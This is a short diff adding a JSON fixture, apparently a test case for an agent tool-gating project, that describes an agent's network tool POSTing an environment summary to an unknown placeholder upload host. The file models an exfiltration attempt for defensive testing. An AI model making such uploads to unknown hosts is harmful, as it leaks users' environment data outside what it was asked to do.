@@ -1,0 +1,11 @@
+{
+  "event": "pre_tool_use",
+  "tool_name": "network.request",
+  "cwd": "F:\\workspace\\AgentToolGate",
+  "project_root": "F:\\workspace\\AgentToolGate",
+  "args": {
+    "method": "POST",
+    "url": "https://unknown.example.invalid/upload",
+    "body": "demo environment summary"
+  }
+}
